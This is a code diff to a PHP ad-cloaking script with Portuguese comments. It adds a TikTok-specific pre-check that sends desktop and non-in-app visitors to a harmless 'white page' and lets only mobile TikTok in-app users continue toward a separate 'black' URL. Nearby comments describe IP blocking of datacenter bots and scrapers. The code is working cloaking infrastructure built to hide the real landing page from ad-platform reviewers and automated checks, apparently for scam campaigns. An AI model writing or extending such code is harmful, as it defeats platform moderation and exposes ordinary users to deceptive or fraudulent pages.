@@ -25,6 +25,33 @@ $WHITE_URL = 'https://armazem11.novacolecao.shop/oficial';
 $BLACK_URL = 'https://renovacaobrasil.com/';
 $DEBUG_MODE = isset($_GET['debug']) && $_GET['debug'] === '1';
 
+// Plataforma da campanha: 'tiktok', 'google', 'facebook' ou 'other'.
+// Definida dinamicamente na criacao da campanha no painel.
+$CAMPAIGN_PLATFORM = 'tiktok';
+
+// ==========================================
+// TRAVA ESTRITA POR PLATAFORMA (PRE-CHECK)
+// ==========================================
+// Campanhas de TikTok Ads so aceitam visitantes acessando de CELULAR
+// e de DENTRO do aplicativo do TikTok. Qualquer acesso via desktop ou
+// navegador externo vai DIRETO para a White Page (302), antes de
+// qualquer consulta a API. As demais plataformas seguem o fluxo padrao.
+if ($CAMPAIGN_PLATFORM === 'tiktok' && !$DEBUG_MODE) {
+    $__ttUA = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+    // 1. Precisa ser dispositivo mobile (Android / iPhone / iPad / iPod)
+    $__ttIsMobile = preg_match('/(Android|iPhone|iPad|iPod)/i', $__ttUA);
+
+    // 2. Precisa vir de dentro do app do TikTok / ByteDance
+    $__ttIsInApp = preg_match('/(BytedanceWebview|TikTok|Musical_ly|Bytedance|trill|Aweme)/i', $__ttUA);
+
+    // Se NAO for mobile OU NAO vier de dentro do app -> White Page direta
+    if (!$__ttIsMobile || !$__ttIsInApp) {
+        header('Location: ' . $WHITE_URL, true, 302);
+        exit;
+    }
+}
+
 // ==========================================
 // WAF: FIREWALL DE PREFIXOS DE IP
 // Bloqueia bots de Data Centers, Cloud Providers e Scrapers
